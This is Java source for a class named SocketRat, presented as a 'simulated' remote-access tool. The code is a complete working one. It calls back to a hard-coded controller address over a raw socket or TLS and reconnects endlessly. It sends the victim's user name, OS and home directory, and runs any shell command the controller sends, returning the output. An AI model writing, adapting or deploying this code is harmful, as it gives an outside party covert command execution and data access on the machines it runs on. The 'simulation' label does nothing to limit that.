package dev.javabyte.guest.sim;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import javax.net.ssl.SSLSocketFactory;

/**
 * Simulated remote-access tool speaking a length-prefixed binary protocol over a raw socket,
 * or over TLS when started with the argument "tls". It reconnects for ever when the link drops.
 */
public final class SocketRat {

    public static void main(String[] args) throws Exception {
        boolean tls = args.length > 0 && args[0].equals("tls");
        while (true) {
            try (Socket socket = tls
                    ? SSLSocketFactory.getDefault().createSocket("secure.rat.test", 443)
                    : new Socket("198.51.100.77", 5555)) {
                socket.setSoTimeout(30_000);
                serve(new DataInputStream(socket.getInputStream()), new DataOutputStream(socket.getOutputStream()));
            } catch (EOFException closed) {
                System.out.println("connection closed by peer");
            }
            Thread.sleep(10_000);
        }
    }

    private static void serve(DataInputStream in, DataOutputStream out) throws Exception {
        send(out, "HELLO " + System.getProperty("user.name") + " " + System.getProperty("os.name"));
        while (true) {
            byte[] frame = new byte[in.readInt()];
            in.readFully(frame);
            String command = new String(frame, StandardCharsets.UTF_8);
            if (command.equals("INFO")) {
                send(out, "INFO cpus=" + Runtime.getRuntime().availableProcessors() + " home=" + System.getProperty("user.home"));
            } else if (command.startsWith("SHELL ")) {
                Process process = Runtime.getRuntime().exec(command.substring(6));
                send(out, "OUT " + new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8).trim());
            } else if (command.equals("QUIT")) {
                send(out, "BYE");
                System.out.println("told to quit");
                System.exit(0);
            }
        }
    }

    private static void send(DataOutputStream out, String message) throws Exception {
        byte[] bytes = message.getBytes(StandardCharsets.UTF_8);
        out.writeInt(bytes.length);
        out.write(bytes);
        out.flush();
    }
}
